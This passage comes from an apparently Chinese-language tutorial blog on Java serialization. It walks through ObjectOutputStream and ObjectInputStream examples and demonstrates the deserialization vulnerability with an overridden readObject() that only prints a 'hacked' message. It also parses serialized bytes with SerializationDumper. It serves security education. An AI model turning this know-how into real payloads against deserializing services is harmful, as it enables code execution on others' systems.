来实现对象的持久存储 , 也可以使用 “ 网络套接字流 “ 来传输对象 .</p><p>​    值得一提的是 , 这里 Output 和 Input 都是针对 “ 内存 “ 来说的 . Output 即将 “ 内存 “ 中的 Java对象 传输到 “ 文件流 “ 或者 “ 网络套接字流 “ 中 , 而 Input 则是将 “ 文件流 “ 或 “ 网络套接字流 “ 中的数据加载到 “ 内存 “ 中 , 这个点容易搞混 , 需要重点关注 .</p><p>​    java.io.ObjectOutputStream 类会通过 writeObject() 方法将 Java 对象写入到数据流中 .</p><h6 id="java-io-ObjectOutputStream-writeObject-ObjectOutputStream-stream"><a href="#java-io-ObjectOutputStream-writeObject-ObjectOutputStream-stream" class="headerlink" title="java.io.ObjectOutputStream.writeObject( ObjectOutputStream stream )"></a><strong>java.io.ObjectOutputStream.writeObject( ObjectOutputStream stream )</strong></h6><p>​    writeObject()方法会将所有 对象的类 , 类签名 , 非瞬态和非静态字段的值 写入到数据流中</p><p>​        1.什么是类签名？</p><p>​        在开发 JNI( Java Native Interface , Java 本地接口 ) 时需要调用 Java 层的方法或创建引用 , 此时就会用到 Java 签名机制 . 比如基本数据类型的签名如下所示 :</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-130852.png"                      alt="image-20230416210851706"                ></p><p>​        还有像 Ljava/lang/Class; , Ljava/lang/String; 等都是类签名 , 这些字符串在解析 Java 序列化数据时会用到 .</p><p>​        2.什么是非瞬态？</p><p>​        瞬态变量( Transient ) 是一个 Java 关键词 , 它用于标记类的成员变量在持久化到字节流时不要被序列化 ; 在通过网络套接字流传输字节流时 , transient 关键词标记的成员变量不会被序列化 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-131300.png"                      alt="image-20230416211300410"                ></p><p>​        因此 , 如果仅想序列化某个类中部分变量 , 除了可以通过继承 Externalizable 接口来指定需要序列化的成员变量 ; 还可以将其他变量添加 transient 关键词 , 使得变量不被序列化 .</p><p>范例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="comment">//用于序列化的ObjectOutputStream类和writeObject方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">wo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//创建一个文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line">        <span class="comment">//创建一个对象输出流，将序列化数据输出文件流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">//调用java.io.ObjectOutputStream.writeObject()方法,将&quot;mes9s0&quot;字符串输出到文件流</span></span><br><span class="line">        <span class="comment">//该方法只能将对象的类，类签名，非瞬态和非静态字段的值写入</span></span><br><span class="line">        oos.writeObject(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        oos.close();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-132214.png"                      alt="image-20230416212213706"                ></p><h5 id="java-io-ObjectInputStream"><a href="#java-io-ObjectInputStream" class="headerlink" title="java.io.ObjectInputStream"></a><strong>java.io.ObjectInputStream</strong></h5><p>​    通过 ObjectOutputStream 类可以将对象写入数据流中 , 而通过 ObjectInputStream 类可以将数据流中的字节数组重构成对象 .</p><p>​    ObjectInputStream 类在重构对象时会从本地 JVM 虚拟机中加载对应的类 , 以确保重构时使用的类与被序列化的类是同一个 . 也就是说 : 反序列化进程的 JVM 虚拟机中必须加载被序列化的类 .</p><p>​    java.io.ObjectInputStream 类会通过 readObject() 方法将数据流中的序列化字符串重构成 Java 对象.</p><h6 id="java-io-ObjectInputStream-readObject-ObjectInputStream-stream"><a href="#java-io-ObjectInputStream-readObject-ObjectInputStream-stream" class="headerlink" title="java.io.ObjectInputStream.readObject( ObjectInputStream stream )"></a>java.io.ObjectInputStream.readObject( ObjectInputStream stream )</h6><p>​    readObject() 方法将读取序列化数据中各个字段的数据并分配给新对象的相应字段来恢复状态 . 需要注意的是 : readObject() 方法仅会反序列化 非静态变量 和 非瞬态变量 . 当读取到一个用 transient 修饰符修饰的变量时 , 将直接丢弃该变量 , 不再进行后续操作 .</p><p>​    此外 , 反序列化过程中 , 需要将重构的对象强制转换成预期的类型 , 比如 String 型变量就需要通过 (String) 修饰符强制转换成原来的类型 .</p><p>​    例如这里将 test.ser 中的序列化字符串进行反序列化操作 .</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">wo2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//序列化,具体注释见wo类</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test2.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        oos.close();</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="comment">//创建一个文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test2.ser&quot;</span>);</span><br><span class="line">        <span class="comment">//创建一个对象输入流,将文件流中的序列化数据放到对象流中（个人理解）</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//调用java.io.ObjectInputStream.readObject()方法重构对象，必须强制类型转换</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) ois.readObject();</span><br><span class="line">        System.out.printf(name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-133311.png"                      alt="image-20230416213311602"                ></p><p>​    可以看到 , String 对象被重构了 , 对象的值 “ mes9s0” 也被还原了 .</p><hr><h3 id="完成的Java序列化-反系列化流程"><a href="#完成的Java序列化-反系列化流程" class="headerlink" title="完成的Java序列化/反系列化流程"></a>完成的Java序列化/反系列化流程</h3><p>​    通过上面的内容 , 已经可以得到一个完整的 Java 序列化 / 反序列化流程 .</p><h4 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h4><p>​    由下面两个类完成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wholeSerializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Man</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">ptr</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>  name + <span class="string">&quot;is a Man!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wholeSerializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Man</span> <span class="variable">man</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Man</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test3.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oot.writeObject(man);</span><br><span class="line">        oot.close();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-144258.png"                      alt="image-20230416224257759"                ></p><p>​        Man 类中存在变量 str 和 方法 prt() . 该类继承了 Serializable 接口 , 表明该类可以被序列化 . ser 类用于执行 Java 序列化过程 . 将 Man 类的实例对象序列化后输出到文件流中 , 并保存在 /tmp/test.ser 文件中 .</p><h4 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wholeSerializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test3.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fin);</span><br><span class="line">        <span class="type">Man</span> <span class="variable">man</span> <span class="operator">=</span> (Man)ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fin.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(man.str);</span><br><span class="line">        System.out.println(man.ptr(<span class="string">&quot;mes9s0&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    unSer 类打开文件流 , 读取 /tmp/test.ser 文件的内容 , 并进行反序列化操作 . 注意要进行强制转换 .</p><p>​    重构对象后 , 输出 Man 类 str 变量的值 , 并且执行 Man 类的 prt() 函数 . 全部执行成功 , 说明 Man 对象的相关字段全部被恢复了 .</p><p>​    一个最简单的 序列化 / 反序列化 过程就结束了 .</p><hr><h3 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h3><p>​    问题就出在 Java 反序列化过程的关键函数 <strong>readObject()</strong> 上 . 这里需要仔细看一下 <strong>readObject()</strong> 方法 .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-145017.png"                      alt="image-20230416225017063"                ></p><p>​    官方允许用户在被序列化的类中重写 readObject() 方法 , 重写后的方法将负责在反序列化时重构当前类对象 .</p><p>​    用户只需要在重写的 readObject() 方法中实现 defaultReadObject() 方法 , 就可以确保反序列化过程正常执行 . 至于添加的代码内容 , 官方没有做任何限制 .</p><p>例子：</p><p>我们自己写一个readObject方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wholeSerializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Man</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">ptr</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>  name + <span class="string">&quot;is a Man!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;hacked by mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wholeSerializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Man</span> <span class="variable">man</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Man</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test3.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oot</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oot.writeObject(man);</span><br><span class="line">        oot.close();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wholeSerializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test3.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fin);</span><br><span class="line">        <span class="type">Man</span> <span class="variable">man</span> <span class="operator">=</span> (Man)ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fin.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(man.str);</span><br><span class="line">        System.out.println(man.ptr(<span class="string">&quot;mes9s0&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-150013.png"                      alt="image-20230416230012645"                ></p><p>​    可以看到 , 在不修改其他代码的情况下 , 通过重写 readObject() 方法时添加其他代码 , 可以使得被添加的代码在反序列化过程中被执行</p><p>​    也就是说 , 如果我们在其中添加恶意代码 , 那么恶意代码也将被反序列化并执行 .我们的恶意代码也会被执行</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-151336.png"                      alt="image-20230416231336099"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-151417.png"                      alt="image-20230416231417211"                ></p><p>​    我们指定的恶意代码被成功执行 , 这就是 Java 反序列化漏洞一个最简单的案例 .</p><hr><h3 id="Java反序列化数据分析"><a href="#Java反序列化数据分析" class="headerlink" title="Java反序列化数据分析"></a>Java反序列化数据分析</h3><p>​    简单分析一下反序列化数据的含义</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-152136.png"                      alt="image-20230416232136223"                ></p><p>​    有一个项目<strong>SerializationDumper</strong>可以很方便的分析Java序列化数据</p><pre><code>1. 先处理序列化数据的十六进制字符串</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getxxd</span>():</span><br><span class="line">        xd = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment">#通过xxd -i 参数 ，便于分离十六进制数据</span></span><br><span class="line">        ret = subprocess.getoutput(<span class="string">&#x27;xxd -i &#x27;</span> + sys.argv[<span class="number">1</span>])</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;0x[a-z0-9]&#123;2&#125;&#x27;</span>)</span><br><span class="line">        res = re.findall(pattern, ret)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                xd = xd + i.strip()</span><br><span class="line">        result = xd.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        getxxd()</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-163343.png"                      alt="image-20230417003343117"                ></p><p>aced00057372001577686f6c6553657269616c697a61626c652e4d616e00000000000000010200014c00037374727400124c6a6176612f6c616e672f537472696e673b787074000668656c6c6f21</p><ol start="2"><li>通过 SerializationDumper 工具解析十六进制字符串.</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-163540.png"                      alt="image-20230417003540242"                ></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 21 - 0x00 15</span><br><span class="line">        Value - wholeSerializable.Man - 0x77686f6c6553657269616c697a61626c652e4d616e</span><br><span class="line">      serialVersionUID - 0x00 00 00 00 00 00 00 01</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 1 - 0x00 01</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - str - 0x737472</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      wholeSerializable.Man</span><br><span class="line">        values</span><br><span class="line">          str</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 6 - 0x00 06</span><br><span class="line">                Value - hello! - 0x68656c6c6f21</span><br></pre></td></tr></table></figure><p>​    <strong>1. ACED0005</strong></p><p>​    <strong>0xAC 0xED</strong> 为 Java 序列化字符串魔术幻数 , 可以看作是 Java 序列化字符串的特征值 , 每次 Java 序列化字符串被创建时 , 都会添加该特征值 .</p><p>​    <strong>0x00 0x05</strong> 为 Java 序列化版本号 , 一般来说版本号都为 : 5 . 很少看到其他数字/</p><p>​    <strong>2. 7372</strong></p><p>​    <strong>0x73</strong> 即 TC_OBJECT , 代表下面内容是一个新的对象 .</p><p>​    <strong>0x72</strong> 即 TC_CLASSDESC , 类描述符 , 代表一个新类的开始</p><p>​    这些属性的定义位于 java.io.ObjectStreamConstants 类中 , 可以参考 Source for java.io.ObjectStreamConstants .</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-164801.png"                      alt="image-20230417004801033"                ></p><p>​    <strong>3. 0002</strong></p><p>​    这里是 Java 序列化属性标识符 , 即 classDescFlags , 该属性字段的值为 5 个标记的算数和</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-16-165250.png"                      alt="image-20230417005250217"                ></p><p>​    <strong>SC_WRITE_METHOD = 0x01</strong> : 如果被序列化的类中重写了 <strong>writeObject()</strong> 方法 , 则设置该标志 , 并使用 <strong>TC_ENDBLOCKDATA</strong> 标记来终止该类的数据 .</p><p>​    <strong>SC_BLOCK_DATA = 0x08</strong> : 如果使用 STREAM_PROTOCOL_2 将 Externalizable 类写入流中 , 则设置该标志 .</p><p>​    <em>这里用的不多 , 内容也比较复杂 , 关于</em> <em>Stream Protocol</em> <em>以及</em> <em>BLOCK DATA</em> 